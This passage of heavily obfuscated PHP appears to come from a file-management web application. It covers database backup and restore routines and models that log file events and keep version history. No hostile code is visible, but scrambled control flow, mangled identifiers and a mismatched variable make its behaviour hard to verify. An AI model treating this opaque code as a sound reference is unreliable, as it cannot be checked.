$dÃœšÕóƒÚ[717]) { $D‰æ°Áé­· = $DÃÊ¾“¿¸Ì[$dÃœšÕóƒÚ[882]]; $DÃÊ¾“¿¸Ì[$dÃœšÕóƒÚ[882]] = substr($D‰æ°Áé­·, 0, strrpos($D‰æ°Áé­·, $dÃœšÕóƒÚ[968])); } goto fª…Ã¬º×; Cö£Œ©¥İƒ: } public function createTable($fÂ©ˆ÷ã…Ã, $dæÇ©ØòÇ¬ = null) { $eåÏš…õà =& $_SERVER[Ö]; if (!IO::exist($fÂ©ˆ÷ã…Ã)) { show_json(LNG($eåÏš…õà[969]), !1); } $DƒÍª¼ª = sqlSplit(IO::getContent($fÂ©ˆ÷ã…Ã)); foreach ($DƒÍª¼ª as $A°Ã©É­Á) { if ($dæÇ©ØòÇ¬) { $E“ŞáÃÚÄ = stripos($A°Ã©É­Á, $eåÏš…õà[970]) === 0; if ($E“ŞáÃÚÄ) { $dæÇ©ØòÇ¬->task[$eåÏš…õà[971]] += 1; } } $this->model()->db()->execute($A°Ã©É­Á); if ($dæÇ©ØòÇ¬ && $E“ŞáÃÚÄ) { $B¬ˆ±äÃîŠ = $eåÏš…õà[972]; preg_match($B¬ˆ±äÃîŠ, $A°Ã©É­Á, $Eƒ’‹œŠè); $dæÇ©ØòÇ¬->task[$eåÏš…õà[973]] = trim($Eªá¬µ˜˜ë[0], $eåÏš…õà[819]); $dæÇ©ØòÇ¬->update(1); } } $this->taskToCache($dæÇ©ØòÇ¬); } public function insertTable($f²»£†Â•Ò, $e‹ƒ±¾„½ = null) { $B¨Â›œ§Ş =& $_SERVER[Ö]; foreach ($f²»£†Â•Ò as $bù‡ÇŠ„) { $dö‡¢ù¡í = basename($bù‡ÇŠ„); $dö‡¢ù¡í = substr($dö‡¢ù¡í, 0, strrpos($dö‡¢ù¡í, $B¨Â›œ§Ş[91])); if ($e‹ƒ±¾„½) { $e‹ƒ±¾„½->task[$B¨Â›œ§Ş[973]] = $dö‡¢ù¡í; } if (get_filesize($bù‡ÇŠ„) == 0) { continue; } $bİ¥ÅÒê÷Ù = $this->sqlToDb($bù‡ÇŠ„, $e‹ƒ±¾„½); if (!$bİ¥ÅÒê÷Ù) { show_json(LNG($B¨Â›œ§Ş[974]) . "\x5b{$dö‡¢ù¡í}\x5d", !1); } } $this->taskToCache($e‹ƒ±¾„½); } public function sqlFromDb($dé¯í²ñŠ, $EæÜÕÑ¨‡, $BÎ¶É‰²Æ« = null, $dœ¸Ïõç„Î = null) { goto b•·Î¨©ãØ; e¯À¡¯Óğ: $c Êğïàí = $CªİÜ…ÑÃİ->getPk(); $Eí…ß¹­ = $CªİÜ…ÑÃİ->getDbFields(); do { $A†î³¢«»Ë = $CªİÜ…ÑÃİ->field($Eí…ß¹­)->order($c Êğïàí . $_SERVER[Ö][976])->selectPage($a‡ˆó×Ó˜, $Dë¹Éçù¶·); $BãÁÑËó¬Â = !empty($A†î³¢«»Ë[$_SERVER[Ö][350]]) ? $A†î³¢«»Ë[$_SERVER[Ö][350]] : array(); if (!($CÒ–¤¬‚ëÌ = count($BãÁÑËó¬Â))) { break; } if ($BÎ¶É‰²Æ«) { $BÎ¶É‰²Æ«->task[$_SERVER[Ö][971]] += $CÒ–¤¬‚ëÌ; } $c¦­¶…Ş©Ş = array(); foreach ($BãÁÑËó¬Â as $E„¤Òö¢¤) { if ($dœ¸Ïõç„Î) { $E„¤Òö¢¤[$_SERVER[Ö][75]] = "\x7b\x69\157\72{$dœ¸Ïõç„Î}\175" . substr($E„¤Òö¢¤[$_SERVER[Ö][75]], strlen("\173\151\157\x3a{$E„¤Òö¢¤[$_SERVER[Ö][736]]}\x7d")); $E„¤Òö¢¤[$_SERVER[Ö][736]] = $dœ¸Ïõç„Î; } $c¦­¶…Ş©Ş[] = $_SERVER[Ö][977] . $this->sqlEncode($E„¤Òö¢¤) . $_SERVER[Ö][978]; } $d‰Å”õµ«£ = "\x49\116\x53\x45\x52\124\x20\111\116\x54\x4f\40\140{$dé¯í²ñŠ}\140\x20\x28\140" . implode($_SERVER[Ö][979], $Eí…ß¹­) . $_SERVER[Ö][980]; fwrite($Däì¤¤®ìõ, $d‰Å”õµ«£ . implode($_SERVER[Ö][981], $c¦­¶…Ş©Ş) . $_SERVER[Ö][67] . PHP_EOL); $Dë¹Éçù¶·++; $fÕë»îŸ‡® += $CÒ–¤¬‚ëÌ; if ($BÎ¶É‰²Æ«) { $BÎ¶É‰²Æ«->update($CÒ–¤¬‚ëÌ); } } while ($CÒ–¤¬‚ëÌ == $a‡ˆó×Ó˜); goto C¨ÍÓ»Éó™; C¨ÍÓ»Éó™: fclose($Däì¤¤®ìõ); return $fÕë»îŸ‡®; goto Dã½İèÆó; b•·Î¨©ãØ: if ($BÎ¶É‰²Æ«) { $BÎ¶É‰²Æ«->task[$_SERVER[Ö][973]] = $dé¯í²ñŠ; } $CªİÜ…ÑÃİ = $this->model($dé¯í²ñŠ); $fÕë»îŸ‡® = 0; goto D§¤¬¹¿Š; D§¤¬¹¿Š: $Dë¹Éçù¶· = 1; $a‡ˆó×Ó˜ = 500; $Däì¤¤®ìõ = fopen($EæÜÕÑ¨‡, $_SERVER[Ö][975]); goto e¯À¡¯Óğ; Dã½İèÆó: } public function sqlToDb($aë‡Ø½Öğ‚, $D¹º‰õÚ¼’ = null) { goto cªÃ—ˆ²Ó¿; e£«óì½Š: $dŞ¤‰õÇ“º = 500 + 1; while (!feof($eÂÃÔÀö¥§)) { if ($D¹º‰õÚ¼’ && $F¦Ò¸Ø–½ñ != 0) { $D¹º‰õÚ¼’->task[$Cóùİò÷µİ[971]] += 1; } $F¦Ò¸Ø–½ñ++; $BßŒ¼ÜËõ  = trim(fgets($eÂÃÔÀö¥§)); $d­ä‚Ğî£µ .= $Cóùİò÷µİ[50] . $this->sqlDecode($BßŒ¼ÜËõ , $this->type); if ($F¦Ò¸Ø–½ñ == $dŞ¤‰õÇ“º) { $d­ä‚Ğî£µ = rtrim(trim($d­ä‚Ğî£µ), $Cóùİò÷µİ[67]); if (!$A¯‘§šêÖÉ->execute($d­ä‚Ğî£µ)) { return !1; } if ($D¹º‰õÚ¼’) { $D¹º‰õÚ¼’->update($F¦Ò¸Ø–½ñ - 1); } $d­ä‚Ğî£µ = $Cóùİò÷µİ[33]; $F¦Ò¸Ø–½ñ = 0; } } fclose($eÂÃÔÀö¥§); goto c…•æøç›; c…•æøç›: if ($d­ä‚Ğî£µ) { $d­ä‚Ğî£µ = rtrim(trim($d­ä‚Ğî£µ), $Cóùİò÷µİ[67]); if (!$A¯‘§šêÖÉ->execute($d­ä‚Ğî£µ)) { return !1; } if ($D¹º‰õÚ¼’) { $D¹º‰õÚ¼’->update($F¦Ò¸Ø–½ñ - 1); } } return !0; goto CÍª†À±ê; cªÃ—ˆ²Ó¿: $Cóùİò÷µİ =& $_SERVER[Ö]; $A¯‘§šêÖÉ = $this->model()->db(); $eÂÃÔÀö¥§ = @fopen($aë‡Ø½Öğ‚, $Cóùİò÷µİ[982]); goto A¡êæ´ƒÔ ; A¡êæ´ƒÔ : if (!$eÂÃÔÀö¥§) { return !1; } $F¦Ò¸Ø–½ñ = 0; $d­ä‚Ğî£µ = $Cóùİò÷µİ[33]; goto e£«óì½Š; CÍª†À±ê: } public function dropTable($AÒ¬ÒÎœÔ¯ = null) { $C‹Ï®˜¿ô· = $this->model()->db(); $Câ¾‚º¨é = $AÒ¬ÒÎœÔ¯ ? array($AÒ¬ÒÎœÔ¯) : $C‹Ï®˜¿ô·->getTables(); if (!$Câ¾‚º¨é) { return; } foreach ($Câ¾‚º¨é as $AÒ¬ÒÎœÔ¯) { $C‹Ï®˜¿ô·->execute("\144\162\157\x70\40\x74\x61\x62\154\x65\40\151\146\x20\145\x78\x69\x73\x74\x73\x20\140{$AÒ¬ÒÎœÔ¯}\140"); } } private function taskToCache($Eâ‰«£š¾Â = null) { $b‹©ë‡³°º =& $_SERVER[Ö]; if (!$Eâ‰«£š¾Â) { return; } $f­“ê¹ÌÊ¢ = array($b‹©ë‡³°º[973] => $Eâ‰«£š¾Â->task[$b‹©ë‡³°º[973]], $b‹©ë‡³°º[971] => $Eâ‰«£š¾Â->task[$b‹©ë‡³°º[971]], $b‹©ë‡³°º[983] => $Eâ‰«£š¾Â->task[$b‹©ë‡³°º[983]]); if ($f­“ê¹ÌÊ¢[$b‹©ë‡³°º[971]] == $f­“ê¹ÌÊ¢[$b‹©ë‡³°º[983]]) { $f­“ê¹ÌÊ¢[$b‹©ë‡³°º[689]] = 1; } Cache::set($b‹©ë‡³°º[984] . $Eâ‰«£š¾Â->task[$b‹©ë‡³°º[363]], $f­“ê¹ÌÊ¢); $Eâ‰«£š¾Â->end(); } private function sqlEncode($aøÉ™Îáœ») { $Câ‚Ùç­Ô =& $_SERVER[Ö]; $B”æÂò°Äì = array(); foreach ($aøÉ™Îáœ» as $EÖ—ßÕÊ) { if (is_array($EÖ—ßÕÊ)) { $EÖ—ßÕÊ = json_encode_force($EÖ—ßÕÊ); } $EÖ—ßÕÊ = addslashes($EÖ—ßÕÊ); $EÖ—ßÕÊ = str_replace(array($Câ‚Ùç­Ô[985], $Câ‚Ùç­Ô[213]), array($Câ‚Ùç­Ô[986], $Câ‚Ùç­Ô[987]), $EÖ—ßÕÊ); $B”æÂò°Äì[] = str_replace($Câ‚Ùç­Ô[55], $Câ‚Ùç­Ô[988], $EÖ—ßÕÊ); } return $Câ‚Ùç­Ô[55] . implode($Câ‚Ùç­Ô[989], $B”æÂò°Äì) . $Câ‚Ùç­Ô[55]; } private function sqlDecode($Eî›«°ÍÏê, $Eµ»˜ñ¦âİ) { $a¬±ÎÑç§ç =& $_SERVER[Ö]; $Eî›«°ÍÏê = str_replace(array($a¬±ÎÑç§ç[986], $a¬±ÎÑç§ç[987]), array($a¬±ÎÑç§ç[985], $a¬±ÎÑç§ç[213]), $Eî›«°ÍÏê); if ($Eµ»˜ñ¦âİ == $a¬±ÎÑç§ç[9]) { $Eî›«°ÍÏê = stripslashes($Eî›«°ÍÏê); } return $Eî›«°ÍÏê; } } goto EÛ¬ÊŞ£ë“; A‚ÃóºÎæ‘: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\x63\145\137\145\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\x54\151\x6d\145", "\164\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\x69\x6f\156"), array("\x64\x65\163\x63", '', "\x69\156\163\x65\162\164\54\165\x70\x64\141\164\145\54\163\145\x6c\145\x63\164", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($e¶àˆ‘³¬Ÿ, $DÈŠçÏÊ—, $b¶ Áã¡¿¿ = '') { goto d¿Ó¶ºóê; b‚¼Ãè‘é: if (!$fÃÀ¤‰ÅÉÔ) { return !1; } if ($this->isCacheEvent($fÃÀ¤‰ÅÉÔ, $DÈŠçÏÊ—)) { return; } if ($b¶ Áã¡¿¿ && is_string($b¶ Áã¡¿¿)) { $b¶ Áã¡¿¿ = array($b¸ë¾’Èš[2107] => $b¶ Áã¡¿¿); } goto d‘õ¨Áİø×; d‘õ¨Áİø×: $AŒ©§ëÜ = array($b¸ë¾’Èš[379] => $e¶àˆ‘³¬Ÿ, $b¸ë¾’Èš[2250] => $fÃÀ¤‰ÅÉÔ[$b¸ë¾’Èš[457]], $b¸ë¾’Èš[2251] => $fÃÀ¤‰ÅÉÔ[$b¸ë¾’Èš[28]], $b¸ë¾’Èš[462] => $fÃÀ¤‰ÅÉÔ[$b¸ë¾’Èš[462]], $b¸ë¾’Èš[1405] => USER_ID, $b¸ë¾’Èš[384] => $DÈŠçÏÊ—, $b¸ë¾’Èš[1407] => $b¶ Áã¡¿¿); $this->addSystemLog($DÈŠçÏÊ—, $AŒ©§ëÜ); return $this->add($AŒ©§ëÜ); goto eÙ£Âà½·Ï; d¿Ó¶ºóê: $b¸ë¾’Èš =& $_SERVER[Ö]; if (!$this->eventSave) { return; } $fÃÀ¤‰ÅÉÔ = Model($b¸ë¾’Èš[1103])->sourceInfo($e¶àˆ‘³¬Ÿ); goto b‚¼Ãè‘é; eÙ£Âà½·Ï: } private function addSystemLog($Fåªó††ª, $d¹šÑ™ò•ç) { $EÜÙãŠ =& $_SERVER[Ö]; if ($Fåªó††ª == $EÜÙãŠ[2252]) { $Fåªó††ª = $d¹šÑ™ò•ç[$EÜÙãŠ[401]][$EÜÙãŠ[2253]]; } else { if (in_array($Fåªó††ª, array($EÜÙãŠ[2054], $EÜÙãŠ[2254]))) { $Fåªó††ª = $d¹šÑ™ò•ç[$EÜÙãŠ[401]][$EÜÙãŠ[685]]; } } $f‚À‰ÉÔ› = array_merge($d¹šÑ™ò•ç, array($EÜÙãŠ[2255] => $d¹šÑ™ò•ç[$EÜÙãŠ[365]], $EÜÙãŠ[2256] => $d¹šÑ™ò•ç[$EÜÙãŠ[2256]])); Model($EÜÙãŠ[2018])->addLog($EÜÙãŠ[2257] . $Fåªó††ª, $f‚À‰ÉÔ›); } private function isCacheEvent($Bå¾†¹ã­¢, $Cö£Ã”Ã¿Ê) { if ($Bå¾†¹ã­¢[$_SERVER[Ö][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($DàÕ¿µö“Ì, $F“Š°óéšÈ) { $F½ä›¤ª¼Ğ =& $_SERVER[Ö]; $eÕŠÍ“¥´ = Model($F½ä›¤ª¼Ğ[1103])->sourceInfo($DàÕ¿µö“Ì); $DŞòÎĞ¸° = array($F½ä›¤ª¼Ğ[2253] => $F“Š°óéšÈ, $F½ä›¤ª¼Ğ[28] => $eÕŠÍ“¥´[$F½ä›¤ª¼Ğ[28]]); return $this->addEvent($DàÕ¿µö“Ì, $F½ä›¤ª¼Ğ[2252], $DŞòÎĞ¸°); } public function eventFileEdit($Bùî¡à¸Ÿ£) { $e´¦ä­Ü–£ =& $_SERVER[Ö]; $d‰”¦ŠÄáë = array($e´¦ä­Ü–£[2258] => $_SERVER[$e´¦ä­Ü–£[2259]], $e´¦ä­Ü–£[1724] => strtolower(ACTION)); return $this->addEvent($Bùî¡à¸Ÿ£, $e´¦ä­Ü–£[2045], $d‰”¦ŠÄáë); } public function eventRecycle($cĞ¦•ê¹¾, $d«‘Ô˜ŞÃ) { return $this->addEvent($cĞ¦•ê¹¾, $_SERVER[Ö][2254], $d«‘Ô˜ŞÃ); } public function eventRemove($d¶‹ŒÑ¼ÍÆ) { $a«ÉÎ¥‘× =& $_SERVER[Ö]; $FËƒ´„Õ¼È = Model($a«ÉÎ¥‘×[1103])->sourceInfo($d¶‹ŒÑ¼ÍÆ); $CĞÛíŠ˜š = $FËƒ´„Õ¼È[$a«ÉÎ¥‘×[28]]; return $this->addEvent($FËƒ´„Õ¼È[$a«ÉÎ¥‘×[457]], $a«ÉÎ¥‘×[2044], $CĞÛíŠ˜š); } public function eventShare($c±êÀ›ÔßÂ, $EÛÇçæÌ½) { return $this->addEvent($c±êÀ›ÔßÂ, $_SERVER[Ö][2054], $EÛÇçæÌ½); } public function eventMove($EÄÆ²®’ìÛ, $aÑ†¾§„¸ğ, $A«ÂÒ‚…„) { goto B˜•…Ö£Ş; B˜•…Ö£Ş: $Cì­†êÜç =& $_SERVER[Ö]; $CìÔØ•œ…ß = Model($Cì­†êÜç[1103]); $BÓ¡¾µ¶Ì = $CìÔØ•œ…ß->sourceInfo($EÄÆ²®’ìÛ); goto A¾Úã§öŒé; f¸¸¤ªÛ°: $this->addEvent($EÄÆ²®’ìÛ, $Cì­†êÜç[488], $Bää¬…¶ôÂ); $BÓ¡¾µ¶Ì = $CìÔØ•œ…ß->sourceInfo($EÄÆ²®’ìÛ); $Bää¬…¶ôÂ = array($Cì­†êÜç[365] => $BÓ¡¾µ¶Ì[$Cì­†êÜç[365]], $Cì­†êÜç[28] => $BÓ¡¾µ¶Ì[$Cì­†êÜç[28]]); goto c†‹İé†…¹; c†‹İé†…¹: $this->addEvent($aÑ†¾§„¸ğ, $Cì­†êÜç[2264], $Bää¬…¶ôÂ); goto Cæ‹’ñ’¬õ; A¾Úã§öŒé: $EŒÅêŠ“®Ñ = $CìÔØ•œ…ß->sourceInfo($aÑ†¾§„¸ğ); $b¶äÅš“–³ = $CìÔØ•œ…ß->sourceInfo($A«ÂÒ‚…„); $Bää¬…¶ôÂ = array($Cì­†êÜç[999] => $aÑ†¾§„¸ğ, $Cì­†êÜç[2260] => $EŒÅêŠ“®Ñ[$Cì­†êÜç[28]], $Cì­†êÜç[2261] => $EŒÅêŠ“®Ñ[$Cì­†êÜç[462]], $Cì­†êÜç[1000] => $A«ÂÒ‚…„, $Cì­†êÜç[2262] => $b¶äÅš“–³[$Cì­†êÜç[28]], $Cì­†êÜç[2263] => $b¶äÅš“–³[$Cì­†êÜç[462]]); goto f¸¸¤ªÛ°; Cæ‹’ñ’¬õ: } public function eventCopy($AŞß…×¡¾) { $this->eventCreate($AŞß…×¡¾, $_SERVER[Ö][486]); } public function eventRename($bê§äÅÇÈ, $FÚ¹®¡Âä«, $dœ‡Ä´“º) { $dğ›Ğ¨¹î =& $_SERVER[Ö]; $a¸Ş®”ÖË = array($dğ›Ğ¨¹î[999] => $FÚ¹®¡Âä«, $dğ›Ğ¨¹î[1000] => $dœ‡Ä´“º); return $this->addEvent($bê§äÅÇÈ, $dğ›Ğ¨¹î[1115], $a¸Ş®”ÖË); } public function eventAddComment($d¥­øˆóô, $d©££ö„®ô) { return $this->addEvent($d¥­øˆóô, $_SERVER[Ö][2265], $d©££ö„®ô); } public function eventAddDesc($a Ã…Ş‚Ã, $AÖÖ¨ŠÂ) { return $this->addEvent($a Ã…Ş‚Ã, $_SERVER[Ö][2266], $AÖÖ¨ŠÂ); } public function listBySource($F»­èéõ”) { goto A³äôš«¾; A³äôš«¾: $A«…ø¢’í =& $_SERVER[Ö]; $BÄ…î¢‡²Ì = Model($A«…ø¢’í[1103])->sourceInfo($F»­èéõ”); $aÎ’˜‘íàµ = array($A«…ø¢’í[379] => $F»­èéõ”); goto d‹›±ˆ‡ĞÁ; Cê—õ¥éºö: $fÃ–Å¹‡Œ = $this->eventListParse($fÃ–Å¹‡Œ, $F»­èéõ”); show_json($fÃ–Å¹‡Œ); goto dî‡ÊÜ’”Ô; d‹›±ˆ‡ĞÁ: if ($BÄ…î¢‡²Ì[$A«…ø¢’í[366]] == $A«…ø¢’í[83]) { $Bí‡ª–íÆŠ = Model($A«…ø¢’í[1103])->listSearchChildren($F»­èéõ”, 20000); $Bí‡ª–íÆŠ[] = $F»­èéõ” . $A«…ø¢’í[357]; $aÎ’˜‘íàµ = array($A«…ø¢’í[365] => array($A«…ø¢’í[7], $Bí‡ª–íÆŠ)); } $fÃ–Å¹‡Œ = $this->where($aÎ’˜‘íàµ)->order($A«…ø¢’í[2267])->selectPage(); if ($fÃ–Å¹‡Œ[$A«…ø¢’í[347]][$A«…ø¢’í[348]] == 0) { $fÃ–Å¹‡Œ[$A«…ø¢’í[347]][$A«…ø¢’í[348]] = 1; $fÃ–Å¹‡Œ[$A«…ø¢’í[350]] = array(array($A«…ø¢’í[379] => $F»­èéõ”, $A«…ø¢’í[2250] => $BÄ…î¢‡²Ì[$A«…ø¢’í[457]], $A«…ø¢’í[1405] => $BÄ…î¢‡²Ì[$A«…ø¢’í[374]], $A«…ø¢’í[384] => $A«…ø¢’í[2268], $A«…ø¢’í[385] => $BÄ…î¢‡²Ì[$A«…ø¢’í[183]], $A«…ø¢’í[1407] => $A«…ø¢’í[33])); } goto Cê—õ¥éºö; dî‡ÊÜ’”Ô: } private function eventListParse($Cš©’ƒÆ¤ó, $cÚ¨ïÕß’Ï) { goto C£Åç±ìí°; d±ŞÓ¿®œ›: return $Cš©’ƒÆ¤ó; goto Aƒô¨à…¼§; C£Åç±ìí°: $fç‰¾ö¿ÃÓ =& $_SERVER[Ö]; $E«Œ™Ò•çƒ = $Cš©’ƒÆ¤ó[$fç‰¾ö¿ÃÓ[350]]; $cõà½›î¾¹ = array_to_keyvalue($E«Œ™Ò•çƒ, $fç‰¾ö¿ÃÓ[33], $fç‰¾ö¿ÃÓ[365]); goto b‰ùø¯«˜; có¨‰ŸÈ‚: $cõà½›î¾¹ = array_unique($cõà½›î¾¹); $FÚÆ¼ö—Ì½ = array_unique(array_to_keyvalue($E«Œ™Ò•çƒ, $fç‰¾ö¿ÃÓ[33], $fç‰¾ö¿ÃÓ[1414])); $Eê³ÖƒÓ‹ = Model($fç‰¾ö¿ÃÓ[473])->userListInfo($FÚÆ¼ö—Ì½); goto E§÷Û„é–; E§÷Û„é–: $f‰Ÿõ‚í…® = Model($fç‰¾ö¿ÃÓ[745])->sourceListInfo($cõà½›î¾¹, !0); foreach ($E«Œ™Ò•çƒ as &$E®æğÜÏÚÚ) { if ($E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[29]] == $fç‰¾ö¿ÃÓ[488] && isset($E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]][$fç‰¾ö¿ÃÓ[999]])) { $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]][$fç‰¾ö¿ÃÓ[999]] = $f‰Ÿõ‚í…®[$E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]][$fç‰¾ö¿ÃÓ[999]]]; $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]][$fç‰¾ö¿ÃÓ[1000]] = $f‰Ÿõ‚í…®[$E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]][$fç‰¾ö¿ÃÓ[1000]]]; } if ($E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[29]] == $fç‰¾ö¿ÃÓ[2264] && isset($E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]][$fç‰¾ö¿ÃÓ[365]])) { $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]][$fç‰¾ö¿ÃÓ[365]] = $f‰Ÿõ‚í…®[$E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]][$fç‰¾ö¿ÃÓ[365]]]; } $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[387]] = $f‰Ÿõ‚í…®[$E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[365]]]; $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[2269]] = $f‰Ÿõ‚í…®[$E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[2256]]]; if ($E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[29]] == $fç‰¾ö¿ÃÓ[2044]) { $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[2269]] = $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[387]]; $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[2256]] = $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[2269]][$fç‰¾ö¿ÃÓ[365]]; $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[387]] = !1; $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[365]] = $fç‰¾ö¿ÃÓ[33]; } $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[2214]] = $Eê³ÖƒÓ‹[$E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[1414]]]; } $Cš©’ƒÆ¤ó[$fç‰¾ö¿ÃÓ[350]] = $E«Œ™Ò•çƒ; goto d±ŞÓ¿®œ›; b‰ùø¯«˜: $bØèÚ„ï½ = array_to_keyvalue($E«Œ™Ò•çƒ, $fç‰¾ö¿ÃÓ[33], $fç‰¾ö¿ÃÓ[2256]); foreach ($E«Œ™Ò•çƒ as $E®æğÜÏÚÚ) { $Dõâƒƒ‡‰Ä = $E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[401]]; if ($E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[29]] == $fç‰¾ö¿ÃÓ[488] && isset($Dõâƒƒ‡‰Ä[$fç‰¾ö¿ÃÓ[999]])) { $cõà½›î¾¹[] = $Dõâƒƒ‡‰Ä[$fç‰¾ö¿ÃÓ[999]] . $fç‰¾ö¿ÃÓ[33]; $cõà½›î¾¹[] = $Dõâƒƒ‡‰Ä[$fç‰¾ö¿ÃÓ[1000]] . $fç‰¾ö¿ÃÓ[33]; } if ($E®æğÜÏÚÚ[$fç‰¾ö¿ÃÓ[29]] == $fç‰¾ö¿ÃÓ[2264] && isset($Dõâƒƒ‡‰Ä[$fç‰¾ö¿ÃÓ[365]])) { $cõà½›î¾¹[] = $Dõâƒƒ‡‰Ä[$fç‰¾ö¿ÃÓ[365]] . $fç‰¾ö¿ÃÓ[33]; } } $cõà½›î¾¹ = array_merge($cõà½›î¾¹, $bØèÚ„ï½, array($cÚ¨ïÕß’Ï . $fç‰¾ö¿ÃÓ[33])); goto có¨‰ŸÈ‚; Aƒô¨à…¼§: } public function removeBySource($dğ˜Í¸ŞøÉ) { $Aåõ¯´êÕ = array($_SERVER[Ö][379] => $dğ˜Í¸ŞøÉ); $this->where($Aåõ¯´êÕ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\143\145\x5f\x68\151\x73\164\157\162\x79"; public function addHistory($B”ÖŠ÷“è, $D–É¯é¼„ = '') { $FÄä´¹¬ˆÆ =& $_SERVER[Ö]; $Dœœ×²åª¯ = array($FÄä´¹¬ˆÆ[379] => $B”ÖŠ÷“è[$FÄä´¹¬ˆÆ[365]], $FÄä´¹¬ˆÆ[1405] => isset($B”ÖŠ÷“è[$FÄä´¹¬ˆÆ[375]]) ? $B”ÖŠ÷“è[$FÄä´¹¬ˆÆ[375]] : $B”ÖŠ÷“è[$FÄä´¹¬ˆÆ[374]], $FÄä´¹¬ˆÆ[416] => $B”ÖŠ÷“è[$FÄä´¹¬ˆÆ[415]], $FÄä´¹¬ˆÆ[516] => $B”ÖŠ÷“è[$FÄä´¹¬ˆÆ[77]], $FÄä´¹¬ˆÆ[2270] => $D–É¯é¼„); $FôÆªÔİºĞ = $GLOBALS[$FÄä´¹¬ˆÆ[6]][$FÄä´¹¬ˆÆ[84]][$FÄä´¹¬ˆÆ[2271]]; if ($FôÆªÔİºĞ > 1) { $this->historyAutoClear($Dœœ×²åª¯[$FÄä´¹¬ˆÆ[365]]); $this->add($Dœœ×²åª¯); } Model($FÄä´¹¬ˆÆ[2272])->eventFileEdit($B”ÖŠ÷“è[$FÄä´¹¬ˆÆ[365]]); } private function historyAutoClear($dÇ¹™Ü—˜) { goto A™‰„ÛŞ¦ô; fã™ä½Ù˜ö: $D’‰ÒÎ¦ˆÜ = array($cé¢Á… á¦[381] => array($cé¢Á… á¦[7], $f¥ÌáÉÁŒ´)); $this->where($D’‰ÒÎ¦ˆÜ)->delete(); Model($cé¢Á… á¦[418])->remove($FµÁïÅ£ˆº); goto b†©–³âë‹; cŸº¤ˆÉô: if ($E§ÆÍéßòß >= 500) { return; } $D’‰ÒÎ¦ˆÜ = array($cé¢Á… á¦[379] => $dÇ¹™Ü—˜); $còÙ‘âÈã = $this->field($cé¢Á… á¦[2275])->where($D’‰ÒÎ¦ˆÜ)->order($cé¢Á… á¦[2267])->select(); goto AîÛ‘¤é¦; FØÕó”ÌŒ: $cÎÃÑ¨î½ = $F‚ÖÒ²‹‘ == $cé¢Á… á¦[2274] ? 3 : $BÙìâ˜ïƒ; if ($BÙìâ˜ïƒ <= 1) { $cÎÃÑ¨î½ = 1; } $E§ÆÍéßòß = $cÎÃÑ¨î½ - 1; goto cŸº¤ˆÉô; AîÛ‘¤é¦: if (!$còÙ‘âÈã || $E§ÆÍéßòß >= count($còÙ‘âÈã)) { return; } $f¥ÌáÉÁŒ´ = array_to_keyvalue($còÙ‘âÈã, $cé¢Á… á¦[33], $cé¢Á… á¦[363]); $f¥ÌáÉÁŒ´ = array_slice($f¥ÌáÉÁŒ´, $E§ÆÍéßòß); goto bÌ¯¤ÑÕš; bÌ¯¤ÑÕš: $FµÁïÅ£ˆº = array_to_keyvalue($còÙ‘âÈã, $cé¢Á… á¦[33], $cé¢Á… á¦[415]); $FµÁïÅ£ˆº = array_slice($FµÁïÅ£ˆº, $E§ÆÍéßòß); if (!$f¥ÌáÉÁŒ´ || !$FµÁïÅ£ˆº) { return; } goto fã™ä½Ù˜ö; A™‰„ÛŞ¦ô: $cé¢Á… á¦ =& $_SERVER[Ö]; $F‚ÖÒ²‹‘ = Model($cé¢Á… á¦[1081])->get($cé¢Á… á¦[2273]); $BÙìâ˜ïƒ = $GLOBALS[$cé¢Á… á¦[6]][$cé¢Á… á¦[84]][$cé¢Á… á¦[2271]]; goto FØÕó”ÌŒ; b†©–³âë‹: } public function listData($eˆ”©¸˜ç†) { goto e®šÆâŒà¢; bç­š…ª: $F­Œ¶ËÏ†‰ = 3; if ($e˜Á¬†³¡ == $A†‰ÎÌåì¾[2274]) { $B›Î¹¢âğò[$A†‰ÎÌåì¾[350]] = array_slice($B›Î¹¢âğò[$A†‰ÎÌåì¾[350]], 0, $F­Œ¶ËÏ†‰); $B›Î¹¢âğò[$A†‰ÎÌåì¾[347]] = array($A†‰ÎÌåì¾[2277] => 1, $A†‰ÎÌåì¾[2278] => 20, $A†‰ÎÌåì¾[2279] => 1, $A†‰ÎÌåì¾[2280] => count($B›Î¹¢âğò[$A†‰ÎÌåì¾[350]])); } return $B›Î¹¢âğò; goto FîÂî—Æ¨õ; e®šÆâŒà¢: $A†‰ÎÌåì¾ =& $_SERVER[Ö]; $bæºÏ’ªÆ = array($A†‰ÎÌåì¾[379] => $eˆ”©¸˜ç†); $c‡ì²Œ†İÒ = 